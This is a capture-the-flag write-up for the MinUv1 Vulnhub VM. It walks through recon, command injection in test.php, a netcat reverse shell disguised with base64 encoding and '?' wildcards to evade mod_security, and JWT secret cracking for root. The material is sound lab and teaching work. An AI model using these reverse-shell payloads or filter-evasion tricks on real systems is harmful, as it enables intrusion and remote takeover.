# MinUv1 Vulnhub Writeup

Link:           [MinUv1 by 8bitsec](https://www.vulnhub.com/entry/minu-1,235/)

* Details:        Boot2Root Virtual Machine
* Author Rating:  Easy/Intermediate
* Flag Count:     1
* Flag Location:  /root/flag.txt
* Flag Contents:  flag{c89031ac1b40954bb9a0589adcb6d174}

## Runsheet

Located the Virtual Machine's IP;

```bash
arp-scan 192.168.56.0/24
```

Nmap Host to identify open ports on the machine and attempt to identify the host operating system;

```bash
nmap -sV -O 192.168.56.102
```

Of particular intrest was the Port 80, which gave us a standard Apache2 Stock landing screen. I applied nikto and dirb against the host to identify any possible subdomians or files of interest;

```bash
nikto -h http://192.168.56.102/
```

```bash
dirb http://192.168.56.102/ /usr/share/wordlists/dirb/common.txt -X php
```

Resulting in the identification of the following interesting file; `test.php`, which contained the ability to see the last user details on who visited the website. It displays a file, and this file contains nothing at the moment, which is displayed through a URI request, looking like so;

```html
http://192.168.56.102/test.php?file=last.html
```

This read to me as some form of PHP execution call to a file, considering the filename that was being called in it, and I considered it to be some form of Local File Inclusion. So I attempted some Wfuzz to speed up the attempt to identify possible Local Files on the machine. The command used was;

```bash
wfuzz -f file,/usr/share/wordlist/wfuzz/general/common.txt http://192.168.56.102/test.php?file=WFUZZ
```

This showed 403 forbidden response, which read as some form of security on the server, which does not help me at all. The next stage would be to test for OS command injection, which could help us identify what command it may be using for reading the file or just try and execute commands on the OS. Wfuzz seemed like the ideal choice to bruteforce OS command injections for this, the command used was;

```bash
wfuzz -f file,/usr/share/wordlist/wfuzz/Injections/All_attacks.txt http://192.168.56.102/test.php?file=WFUZZ
```

After a lot of checks, we identified that the command `|dir` in the `?file=` gave us a directory listing, meaning we have some form of code execution. Next was to find the command executed by this, from what we could tell, its reading a file, and by doing `--version`, we are told it is using cat, a basic application for reading a file. We have now found out that we can use the `|` operand to add a new command and bypass whatever security they have. Now we need to try and execute commands on the system. Since we know the `|` operander works, we can start trying to execute commands as possible.

Firstly, we want to figure out the command we want to execute, in this case, we are trying to get a reverse shell to our kali image. The command we want to execute is;

```bash
nc -e /bin/sh 192.168.56.101 1337
```

Obviously this command wont execute, due to the filtering we have seen, so we need some encoding to bypass this. The most common encoding is base64, which can be called in linux by using `base64` and by using the extension command `-d` which will decode it. To usually call this command, we usually call `echo "$base64command" | base64 -d`, but in case the Path variable is not set, we should be doing absolute pathing so we would expand it to `/bin/echo "$base64command"|/usr/bin/base64 -d`. Finally, we want to pipe that into sh, so we add to the end `/bin/echo "$base64command"|/usr/bin/base64 -d|/bin/sh`. Finally we needed to execute this command alongside the full command, using `|` will not work, but using `&` will work for this. Giving us the command;

```bash
&/bin/echo bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjU2LjEwMSAxMzM3Cg==|/usr/bin/base64 -d|/bin/sh
```

Attempting this will give us a straight away 403, since we have not tried to hide our commands like base64, and echo, which are both considered dangerous commands. One of the tricks I learnt a while back was the usage of `?` in a command name in linux, for example, calling to `/bin/echo` could be called by replacing some of the letters, giving us `/bin/ech?`, which will still execute the same command, just avoids filters, and since we already have the URI component containing a `?`, its very likely that it will execute. To save time, I have already done this in the below command.

```bash
&/bin/ech? bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjU2LjEwMSAxMzM3Cg==|/u?r/bin/b?se64 -d|/bin/?h
```

This still did not work, so we need to find why, some filters will avoid letting you add `=` or `&` to a URI request, so lets try chainging them, firstly, lets modify the `&` to a `%26`, also known as the URI encoding for `&`. Next we need to remove the `==` from our string, but if we remove it raw from our Base64, it will destory our command. One thing I was informed of was that by adding a trailing space to our base64 encoded command, we can remove one `=` sign, and by adding 2, we remove both of them. So our input to encode our base64 command would be `echo "nc -e /bin/sh 192.168.56.101 1337  " | base64` which gives us the final command;

```bash
%26/bin/ech? bmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjU2LjEwMSAxMzM3ICAK|/u?r/b?n/b?se64 -d|/bin/?h
```

By running a listener on our machine using the command below, we are given a shell to use.

```bash
nc -nvlp 1337
```

Firstly, we find out we are on the user account `www-data`, which means we are not root just yet. So I start by using a basic linux privlage escalation checker, the [ihack4falafel impelmentation of GotMilks guide](https://github.com/ihack4falafel/OSCP/blob/master/BASH/LinuxPrivCheck.sh), which tells me we have access another user on the box, bob. a quick `ls -al` of the /home/ directory tells us we can read this directory. Inside, we have a file called `._pw_`, which we can read and contains the following string.

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg
```

I got to wondering what the string contains, and after a quick look, I seperated the strings based upon the `.` which seperated parts of the string. Breaking it down like this gave us the following;

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ
.
pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg
```

A check of each string on HashID could not find the first 2, but the 3rd was a SHA256 variant. I put the next 2 into CyberChef under magic, and it showed me it was Base64, doing base64 against them gave us the following.

```json
{"alg":"HS256","typ":"JWT"}
.
{"sub":"1234567890","name":"John Doe","iat":1516239022}
.
pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cwg
```

The part that called our attention was the `"typ": "JWT"` which showed us (after a quick google search) that this was in fact a JSON Web Token, used for authentication. We first spent ages trying to find a usage for it, and then got frustrated and ended up googling more to find out about that standard. The final string is a SHA256 that is a hash of the following;

```text
SHA256{
    String1+
    String2+
    Secret
}
```

The secret is the only part of the JWT SHA256 we currently do not have, and I assume that is what we are looking for, so lets find a way to crack it, in this case, a piece of software already exists to do it for us. Its called [C-JWT-Cracker](https://github.com/brendan-rius/c-jwt-cracker), which speeds up the process a lot.

By using this executable, alongside the JWT, I was able to get the Secret in under 2 minuites, but it will use 100% on all cores of your CPU.

```bash
root@kali:~/c-jwt-cracker$ ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.pn55j1CFpcLjvReaqyJr0BPEMYUsBdoDxEPo6Ft9cw
Secret is "mlnV1"
```

The secret reminded me of the boxes name, so I tried it to `su root` with that as the password, and bam, we got root on MinUv1. Finally we `cat /root/flag.txt` and we are done.

```text
  __  __ _       _    _      __
 |  \/  (_)     | |  | |    /_ |
 | \  / |_ _ __ | |  | |_   _| |
 | |\/| | | '_ \| |  | \ \ / / |
 | |  | | | | | | |__| |\ V /| |
 |_|  |_|_|_| |_|\____/  \_/ |_|


# You got r00t!

flag{c89031ac1b40954bb9a0589adcb6d174}

# You probably know this by now but the webserver on this challenge is
# protected by mod_security and the owasp crs 3.0 project on paranoia level 3.
# The webpage is so poorly coded that even this configuration can be bypassed
# by using the bash wildcard ? that allows mod_security to let the command through.
# At least that is how the challenge was designed ;)
# Let me know if you got here using another method!

# contact@8bitsec.io
# @_8bitsec
```